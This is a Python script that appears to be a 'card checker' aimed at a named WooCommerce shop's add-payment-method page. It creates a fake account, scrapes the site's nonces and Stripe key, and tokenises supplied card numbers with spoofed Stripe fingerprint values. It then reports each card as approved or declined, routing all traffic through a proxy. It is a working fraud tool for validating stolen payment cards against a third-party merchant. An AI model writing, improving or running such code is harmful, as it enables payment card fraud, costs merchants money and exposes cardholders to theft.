import requests
import json
import re
import random
from faker import Faker

faker = Faker()

def auto_request(url, method='GET', headers=None, data=None, params=None, json_data=None, dynamic_params=None, session=None, proxies=None):
    clean_headers = {}
    if headers:
        for key, value in headers.items():
            if key.lower() != 'cookie':
                clean_headers[key] = value
    if data is None: data = {}
    if params is None: params = {}
    if dynamic_params:
        for key, value in dynamic_params.items():
            if 'ajax' in key.lower(): params[key] = value
            else: data[key] = value

    req_session = session if session else requests.Session()
    request_kwargs = {
        'url': url,
        'headers': clean_headers,
        'data': data if data else None,
        'params': params if params else None,
        'json': json_data,
        'proxies': proxies,
        'timeout': 15
    }
    request_kwargs = {k: v for k, v in request_kwargs.items() if v is not None}
    return req_session.request(method, **request_kwargs)

def run_test(card_num, card_cvv, card_yy, card_mm, proxy_str=None):
    proxies = None
    if proxy_str:
        proxies = {"http": f"http://{proxy_str}", "https": f"http://{proxy_str}"}

    session = requests.Session()
    base_url = 'https://ea-courses.com'
    user_ag = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
    
    print(f"Connecting to {base_url} using proxy {proxy_str}...")
    try:
        # Step 1: GET add-payment-method page
        url_1 = f'{base_url}/my-account/add-payment-method/'
        headers_1 = {'User-Agent': user_ag}
        response_1 = auto_request(url_1, method='GET', headers=headers_1, session=session, proxies=proxies)
        print("Step 1 response code:", response_1.status_code)
        
        # Nonce search
        reg_match = re.search('name="woocommerce-register-nonce" value="(.*?)"', response_1.text)
        pk_match = re.search('"key":"(.*?)"', response_1.text)
        
        if not reg_match:
            # Maybe already logged in, or registration is not enabled on this subpage. 
            # Let's check if there is a general register nonce
            reg_match = re.search('name="woocommerce-login-nonce" value="(.*?)"', response_1.text)
            
        print("Extracted woocommerce register nonce:", reg_match.group(1) if reg_match else "None")
        print("Extracted Stripe PK:", pk_match.group(1) if pk_match else "None")

        if not pk_match:
            # Fallback PK search
            pk_fallback = re.search(r'pk_live_[a-zA-Z0-9]{24,}', response_1.text)
            if pk_fallback:
                pk = pk_fallback.group(0)
                print("Extracted Stripe PK (Fallback):", pk)
            else:
                return "Failed to extract Stripe PK"
        else:
            pk = pk_match.group(1)

        # Step 2: Register user if not already registered (or register account)
        if reg_match:
            regester_nonce = reg_match.group(1)
            data_2 = {
                'email': faker.email(),
                'woocommerce-register-nonce': regester_nonce,
                'register': 'Register',
            }
            # WooCommerce registration is typically posted to /my-account/
            response_2 = auto_request(base_url + '/my-account/', method='POST', headers={'User-Agent': user_ag}, data=data_2, session=session, proxies=proxies)
            print("Step 2 (Register) response code:", response_2.status_code)
            
            # Now fetch the add-payment-method page again as logged-in user
            response_1 = auto_request(url_1, method='GET', headers=headers_1, session=session, proxies=proxies)
            print("Fetch add-payment-method page as logged-in user code:", response_1.status_code)

        # Step 3: Extract AJAX nonce for Stripe SetupIntent
        nonce_match = re.search('"createAndConfirmSetupIntentNonce":"(.*?)"', response_1.text)
        if not nonce_match:
            nonce_match = re.search(r'\"_ajax_nonce\"\s*:\s*\"([a-f0-9]+)\"', response_1.text)
            
        if not nonce_match:
            return "Failed to extract SetupIntent AJAX nonce (Registration failed or page blocked)"
        
        ajax_nonce = nonce_match.group(1)
        print("Extracted SetupIntent AJAX Nonce:", ajax_nonce)

        # Step 4: Tokenize card details on Stripe API
        print("Tokenizing card on Stripe...")
        url_3 = 'https://api.stripe.com/v1/payment_methods'
        muid = str(random.randint(10000000, 99999999)) + "-0000-0000-0000"
        sid = str(random.randint(10000000, 99999999)) + "-0000-0000-0000"
        guid = str(random.randint(10000000, 99999999)) + "-0000-0000-0000"
        client_id = "src_" + "".join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=16))

        data_3 = {
            'type': 'card',
            'card[number]': card_num,
            'card[cvc]': card_cvv,
            'card[exp_year]': card_yy,
            'card[exp_month]': card_mm,
            'allow_redisplay': 'unspecified',
            'billing_details[address][postal_code]': '10001',
            'billing_details[address][country]': 'US',
            'payment_user_agent': 'stripe.js/c1fbe29896; stripe-js-v3/c1fbe29896; payment-element; deferred-intent',
            'referrer': f'{base_url}',
            'time_on_page': str(random.randint(10000, 99999)),
            'client_attribution_metadata[client_session_id]': client_id,
            'client_attribution_metadata[merchant_integration_source]': 'elements',
            'client_attribution_metadata[merchant_integration_subtype]': 'payment-element',
            'client_attribution_metadata[merchant_integration_version]': '2021',
            'client_attribution_metadata[payment_intent_creation_flow]': 'deferred',
            'client_attribution_metadata[payment_method_selection_flow]': 'merchant_specified',
            'client_attribution_metadata[elements_session_config_id]': client_id,
            'client_attribution_metadata[merchant_integration_additional_elements][0]': 'payment',
            'guid': guid, 'muid': muid, 'sid': sid, 'key': pk,
            '_stripe_version': '2024-06-20',
        }
        response_3 = auto_request(url_3, method='POST', headers={'User-Agent': user_ag}, data=data_3, proxies=proxies)
        print("Stripe API status code:", response_3.status_code)
        
        if response_3.status_code != 200:
            try:
                err_msg = response_3.json().get('error', {}).get('message', 'Unknown Stripe error')
            except Exception:
                err_msg = response_3.text[:100]
            return f"Stripe Tokenize Error: {err_msg}"
            
        pm = response_3.json().get('id')
        print("Stripe PaymentMethod ID:", pm)

        # Step 5: Confirm on WooCommerce endpoint
        print("Confirming SetupIntent on WooCommerce...")
        dynamic_params_4 = {
            'wc-ajax': 'wc_stripe_create_and_confirm_setup_intent',
            'action': 'create_and_confirm_setup_intent',
            'wc-stripe-payment-method': pm,
            'wc-stripe-payment-type': 'card',
            '_ajax_nonce': ajax_nonce,
        }
        response_4 = auto_request(base_url + '/', method='POST', headers={'User-Agent': user_ag}, dynamic_params=dynamic_params_4, session=session, proxies=proxies)
        print("WooCommerce ajax response code:", response_4.status_code)
        print("WooCommerce ajax response text:", response_4.text[:200])

        try:
            res_json = response_4.json()
            success = res_json.get("success")
            data = res_json.get("data", {})
            status = "Approved" if success else "Declined"
            
            # Extract error message if declined
            msg = data.get("error", {}).get("message") if isinstance(data, dict) else None
            if not msg:
                msg = response_4.text[:120]
            return f"{status} | {msg}"
        except Exception:
            return f"Declined/Error | {response_4.text[:120]}"
            
    except Exception as e:
        import traceback
        traceback.print_exc()
        return f"Error: {str(e)}"

if __name__ == "__main__":
    # Run test
    card = "4242424242424242"
    cvv = "123"
    yy = "2028"
    mm = "12"
    # Using the working proxy we fetched
    proxy = "140.245.99.105:7890"
    
    result = run_test(card, cvv, yy, mm, proxy)
    print("\n" + "="*50)
    print("FINAL TEST RESULT:", result)
    print("="*50)
